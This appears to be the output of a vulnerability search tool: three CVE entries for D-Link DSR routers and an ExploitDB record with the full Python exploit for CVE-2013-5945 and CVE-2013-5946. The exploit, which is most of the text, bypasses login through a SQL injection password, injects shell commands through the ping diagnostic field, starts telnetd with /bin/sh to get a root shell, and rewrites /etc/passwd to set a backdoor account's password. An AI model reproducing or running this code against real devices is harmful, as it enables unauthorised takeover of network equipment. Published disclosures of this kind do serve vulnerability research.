检索到漏洞和exp的总条数:4
{'source': 'CVE', '_id': '2013-7004', 'description': 'D-Link DSR-150 with firmware before 1.08B44; DSR-150N with firmware before 1.05B64; DSR-250 and DSR-250N with firmware before 1.08B44; and DSR-500, DSR-500N, DSR-1000, and DSR-1000N with firmware before 1.08B77 have a hardcoded account of username gkJ9232xXyruTRmY, which makes it easier for remote attackers to obtain access by leveraging knowledge of the username.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-7004'], 'msb': []}
{'source': 'CVE', '_id': '2013-7005', 'description': 'D-Link DSR-150 with firmware before 1.08B44; DSR-150N with firmware before 1.05B64; DSR-250 and DSR-250N with firmware before 1.08B44; and DSR-500, DSR-500N, DSR-1000, and DSR-1000N with firmware before 1.08B77 stores account passwords in cleartext, which allows local users to obtain sensitive information by reading the Users[#]["Password"] fields in /tmp/teamf1.cfg.ascii.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-7005'], 'msb': []}
{'source': 'CVE', '_id': '2013-5946', 'description': 'The runShellCmd function in systemCheck.htm in D-Link DSR-150 with firmware before 1.08B44; DSR-150N with firmware before 1.05B64; DSR-250 and DSR-250N with firmware before 1.08B44; and DSR-500, DSR-500N, DSR-1000, and DSR-1000N with firmware before 1.08B77 allows remote attackers to execute arbitrary commands via shell metacharacters in the (1) "Ping or Trace an IP Address" or (2) "Perform a DNS Lookup" section.', 'osvdb': [], 'bid': [], 'cve': ['CVE-2013-5946'], 'msb': []}
{'code': '#!/usr/bin/python\r\n#\r\n# CVEs:                  CVE-2013-5945 - Authentication Bypass by SQL-Injection\r\n#                        CVE-2013-5946 - Privilege Escalation by Arbitrary Command Execution\r\n#\r\n# Vulnerable Routers:    D-Link DSR-150 (Firmware < v1.08B44)\r\n#                        D-Link DSR-150N (Firmware < v1.05B64)\r\n#                        D-Link DSR-250 and DSR-250N (Firmware < v1.08B44)\r\n#                        D-Link DSR-500 and DSR-500N (Firmware < v1.08B77)\r\n#                        D-Link DSR-1000 and DSR-1000N (Firmware < v1.08B77)\r\n#\r\n# Likely to work on:     D-Link DWC-1000\r\n# \r\n# Download URL:          http://tsd.dlink.com.tw\r\n# \r\n# Arch:                  mips and armv6l, Linux\r\n# \r\n# Author:                0_o -- null_null\r\n#                        nu11.nu11 [at] yahoo.com\r\n#                        Oh, and it is n-u-one-one.n-u-one-one, no l\'s...\r\n#                        Wonder how the guys at packet storm could get this wrong :(\r\n# \r\n# Date:                  2013-08-18\r\n# \r\n# Purpose:               Get a non-persistent root shell on your D-Link DSR. \r\n# \r\n# Prerequisites:         Network access to the router ports 443 and 23.\r\n#                        !!! NO AUTHENTICATION CREDENTIALS REQUIRED !!!\r\n#\r\n# \r\n# Coordinated Disclosure -- history and timeline:\r\n# \r\n# 2013-09-12:   Informed Heise Security and asked for their support on this case\r\n# 2013-09-13:   Informed the manufacturer D-Link via \r\n#               http://www.dlink.com/us/en/support/security-advisories/report-vulnerabilities/  (contact form is buggy!)\r\n#               http://www.d-link.co.za/contactus/feedback/ (contact request submitted)\r\n#               http://www.dlink.com/de/de/contact-d-link (contact form is buggy!)\r\n#               mail@dlink.ru (contact request sent)\r\n#               info@dlink.ee (contact request sent)\r\n#               info@dlink.de (contact request sent)\r\n# 2013-09-14:   Informed the German Federal Office for Information Security (BSI) via certbund@bsi.bund.de  \r\n# 2013-09-16:   D-Link Russia and D-Link Germany claim to have forwarded my request.\r\n# 2013-09-17:   German BSI responds, contact established.\r\n# 2013-09-24:   Requested CVE-IDs.\r\n# 2013-09-25:   Heise responds, contact established.\r\n# 2013-09-27:   D-Link asks for details on vulns and the exploit code.\r\n#               Mitre assigns two CVEs:\r\n#                  CVE-2013-5945 -- authentication bypass\r\n#                  CVE-2013-5946 -- privilege escalation\r\n# 2013-09-30:   D-Link has received the exploit and documentation via BSI\r\n# 2013-11-29:   Patches are available for the DSR router series via tsd.dlink.com.tw\r\n#                 DSR-150:                Firmware v1.08B44\r\n#                 DSR-150N:               Firmware v1.05B64\r\n#                 DSR-250 and DSR-250N:   Firmware v1.08B44\r\n#                 DSR-500 and DSR-500N:   Firmware v1.08B77\r\n#                 DSR-1000 and DSR-1000N: Firmware v1.08B77\r\n# 2013-12-03:   Public Disclosure\r\n#\r\n# And now - the fun part :-)\r\n#\r\n\r\n\r\nimport httplib\r\nimport urllib\r\nimport telnetlib\r\nimport time\r\nimport sys\r\nimport crypt\r\nimport random\r\nimport string\r\n\r\n\r\n##############################\r\n#\r\n# CHANGE THESE VALUES -- BEGIN\r\n#\r\n# Your router\'s IP:PORT\r\nipaddr = "192.168.10.1:443"\r\n# Password to be set (by this hack) on the backdoor account\r\nbdpasswd = "password"\r\n#\r\n# CHANGE THESE VALUES -- END\r\n#\r\n# persistent config file:    /tmp/teamf1.cfg.ascii\r\n#                            Edit this file to make your changes persistent.\r\n# \r\n##############################\r\n\r\n\r\ncookie = ""\r\npid = -2\r\nbduser = ""\r\n    \r\n\r\ndef request(m = "", u = "", b = "", h = ""):\r\n    global ipaddr\r\n    conn = httplib.HTTPSConnection(ipaddr, timeout = 15)\r\n    assert m in ["GET", "POST"]\r\n    conn.request(method = m, url = u, body = b, headers = h)\r\n    ret = conn.getresponse()\r\n    header = ret.getheaders()\r\n    data = ret.read()\r\n    conn.close()\r\n    return (header, data)\r\n\r\n\r\ndef login(user, passwd):\r\n    global ipaddr\r\n    headers = {\'Accept\': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\r\n               \'User-Agent\': "Exploit",\r\n               \'Referer\': "https://" + ipaddr + "/scgi-bin/platform.cgi",\r\n               \'Content-Type\': "application/x-www-form-urlencoded"}\r\n    body = {\'thispage\'                          : "index.htm",\r\n            \'Users.UserName\'                    : user,\r\n            \'Users.Password\'                    : passwd,\r\n            \'button.login.Users.deviceStatus\'   : "Login",\r\n            \'Login.userAgent\'                   : "Exploit"}\r\n    return request("POST", "/scgi-bin/platform.cgi", urllib.urlencode(body), headers)\r\n    \r\n    \r\ndef logout():\r\n    global ipaddr, cookie\r\n    headers = {\'Accept\': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\r\n               \'User-Agent\': "Exploit",\r\n               \'Referer\': "https://" + ipaddr + "/scgi-bin/platform.cgi",\r\n               \'Content-Type\': "application/x-www-form-urlencoded"}\r\n    body = ""\r\n    return request("GET", "/scgi-bin/platform.cgi?page=index.htm", urllib.urlencode(body), headers)\r\n\r\n\r\ndef execCmd(cmd = None):\r\n    global ipaddr, cookie\r\n    assert cmd != None\r\n    headers = {\'Accept\': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",\r\n               \'User-Agent\': "Exploit",\r\n               \'Referer\': "https://" + ipaddr + "/scgi-bin/platform.cgi?page=systemCheck.htm",\r\n               \'Cookie\': cookie,\r\n               \'Content-Type\': "application/x-www-form-urlencoded"}\r\n    body = {\'thispage\'                          : "systemCheck.htm",\r\n            \'ping.ip\'                           : "localhost;" + cmd,\r\n            \'button.traceroute.diagDisplay\'     : "Traceroute"}\r\n    return request("POST", "/scgi-bin/platform.cgi", urllib.urlencode(body), headers)\r\n\r\n\r\ndef findPid(mystr = None):\r\n    # "  957 root      2700 S    /usr/sbin/telnetd -l /bin/login"\r\n    assert mystr != None\r\n    mypid = 0\r\n    (h, d) = execCmd(cmd = "ps|grep telnetd|grep -v grep");\r\n    s = d.find(mystr)\r\n    if s > 0:\r\n        # telnetd is running\r\n        cand = d[s - 50 : s]\r\n        try:\r\n            mypid = int(cand.split("\\n")[1].split()[0])\r\n        except IndexError:\r\n            mypid = int(cand.split(">")[1].split()[0])\r\n    return mypid\r\n\r\n\r\ndef restartTelnetd(mystr1 = None, mystr2 = None):\r\n    assert mystr1 != None and mystr2 != None\r\n    global pid\r\n    pid = findPid("telnetd -l /bin/")\r\n    if pid > 0:\r\n        # Stopping the running telnetd\r\n        print "[+] Stopping telnetd (" + str(pid) + "): ",\r\n        sys.stdout.flush()\r\n        (h, d) = execCmd("kill " + str(pid))\r\n        pid = findPid(mystr1)\r\n        if pid > 0:\r\n            print "FAILURE"\r\n            sys.exit(-1)\r\n        else: \r\n            print "OK"\r\n    # Starting a new telnetd\r\n    print "[+] Starting telnetd: ",\r\n    sys.stdout.flush()\r\n    (h, d) = execCmd("telnetd -l " + mystr2)\r\n    pid = findPid("telnetd -l " + mystr2)\r\n    if pid > 0:\r\n        print "OK (" + str(pid) + ")"\r\n    else: \r\n        print "FAILURE"\r\n        sys.exit(-1)\r\n    \r\n\r\ndef main():\r\n    global ipaddr, cookie, pid, bduser, bdpasswd\r\n    user = "admin"\r\n    passwd = "\' or \'a\'=\'a"\r\n    print "\\n\\nPrivilege Escalation exploit for D-Link DSR-250N (and maybe other routers)"\r\n    print "This change is non-persistent to device reboots."\r\n    print "Created and coded by 0_o (nu11.nu11 [at] yahoo.com)\\n\\n"\r\n    # Logging into the router\r\n    print "[+] Trying to log into the router: ",\r\n    sys.stdout.flush()\r\n    (h, d) = login(user, passwd)\r\n    if d.find("User already logged in") > 0:\r\n        print "FAILURE"\r\n        print "[-] The user \\"admin\\" is still logged in. Please log out from your current session first."\r\n        sys.exit(-1)\r\n    elif d.find(\'<a href="?page=index.htm">Logout</a>\') > 0:\r\n        while h:\r\n            (c1, c2) = h.pop()\r\n            if c1 == \'set-cookie\':\r\n                cookie = c2\r\n                break\r\n        print "OK (" + cookie + ")"\r\n    elif d.find("Invalid username or password") > 0:\r\n        print "FAILURE"\r\n        print "[-] Invalid username or password"\r\n        sys.exit(-1)\r\n    else:\r\n        print "FAILURE"\r\n        print "[-] Unable to login."\r\n        sys.exit(-1)\r\n        \r\n    # Starting a telnetd with custom parameters\r\n    print "[+] Preparing the hack..."\r\n    restartTelnetd("/bin/login", "/bin/sh")\r\n    \r\n    # Do the h4cK\r\n    print "[+] Hacking the router..."\r\n    print "[+] Getting the backdoor user name: ",\r\n    sys.stdout.flush()\r\n    tn = telnetlib.Telnet(ipaddr.split(":")[0])\r\n    tn.read_very_eager()\r\n    tn.write("cat /etc/profile\\n")\r\n    time.sleep(5)\r\n    data = tn.read_very_eager()\r\n    for i in data.split("\\n"):\r\n        if i.find(\'"$USER"\') > 0:\r\n            bduser = i.split(\'"\')[3]\r\n            break\r\n    if len(bduser) > 0:\r\n        print "OK (" + bduser + ")"\r\n    else:\r\n        print "FAILURE"\r\n        sys.exit(-1)\r\n    print "[+] Setting the new password for " + bduser + ": ",\r\n    sys.stdout.flush()\r\n    tn.write("cat /etc/passwd\\n")\r\n    time.sleep(5)\r\n    data = tn.read_very_eager()\r\n    data = data.split("\\n")\r\n    data.reverse()\r\n    data.pop()\r\n    data.reverse()\r\n    data.pop()\r\n    data = "\\n".join(data)\r\n    for i in data.split("\\n"):\r\n        if i.find(bduser) >= 0:\r\n            line = i.split(\':\')\r\n            s1 = string.lowercase + string.uppercase + string.digits\r\n            salt = \'\'.join(random.sample(s1,2))\r\n            pw = crypt.crypt(bdpasswd, salt)\r\n            line[1] = pw\r\n            # doesn\'t work for some odd reason -- too lazy to find out why\r\n            #salt = \'\'.join(random.sample(s1,8))\r\n            #line[1] = crypt.crypt(bdpasswd, \'$1$\' + salt + \'$\')\r\n            data = data.replace(i, ":".join(line))\r\n            break\r\n    tn.write(\'echo -en "" > /etc/passwd\\n\')\r\n    time.sleep(5)\r\n    for i in data.split("\\n"):\r\n        tn.write(\'echo -en \\\'\' + i + \'\\n\\\' >> /etc/passwd\\n\')\r\n        time.sleep(1)\r\n    data = tn.read_very_eager()    \r\n    tn.close()\r\n    if data.find(pw) >= 0:\r\n        print "OK (" + pw + ")"\r\n        success = True\r\n    else:\r\n        print "FAILURE"\r\n        print "[-] Could not set the new password."\r\n        sys.exit(-1)\r\n    \r\n    # Switching back to the originals\r\n    print "[+] Mobbing up..."\r\n    restartTelnetd("/bin/sh", "/bin/login")\r\n    \r\n    # Logging out\r\n    print "[+] Logging out: ",\r\n    sys.stdout.flush()\r\n    (h, d) = logout()\r\n    if d.find(\'value="Login"\') > 0:\r\n        print "OK"\r\n    else:\r\n        print "FAILURE"\r\n        print "[-] Unable to determine if user is logged out."\r\n\r\n    # Print success message\r\n    if success:\r\n        print "[+] You can now log in via SSH and Telnet by using:"\r\n        print "    user: " + bduser\r\n        print "    pass: " + bdpasswd\r\n        print "    These changes will be reverted upon router reboot."\r\n        print "    Edit \\"/tmp/teamf1.cfg.ascii\\" to make your changes persistent."\r\n\r\nmain()\r\nsys.exit(0)', 'description': 'D-Link DSR Router Series - Remote Command Execution', 'author': '0_o', '_id': 30062, 'source': 'ExploitDB', 'platform': 'hardware', 'date': '2013-12-06T00:00:00+00:00', 'cve': ['CVE-2013-5945', 'CVE-2013-5946'], 'type': 'webapps', 'port': 0}
